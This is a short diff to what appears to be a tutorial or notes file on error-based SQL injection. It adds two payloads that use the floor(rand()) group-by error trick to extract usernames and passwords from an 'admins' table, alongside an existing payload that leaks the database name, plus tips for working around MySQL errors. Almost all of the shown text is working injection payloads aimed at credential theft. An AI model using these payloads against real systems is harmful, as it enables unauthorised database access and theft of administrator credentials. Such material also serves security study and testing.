@@ -38,6 +38,8 @@ We may get an error regarding too many columns for operand if the injection vect
 We can play aroun with other commands as below:
 
 `' or (select 1 from (Select count(*),concat((select database()),"+",floor(rand()*2))a from information_schema.tables group by a)b)#` 
+`' or (select 1 from (Select count(*),concat((select username from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)`  
+`' or (select 1 from (Select count(*),concat((select password from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)#`  
 
 _'Operand should contain 1 column(s)' = prepend `(select 1`  
 'Subquery returns more than 1 row' = keep running the query until error!_
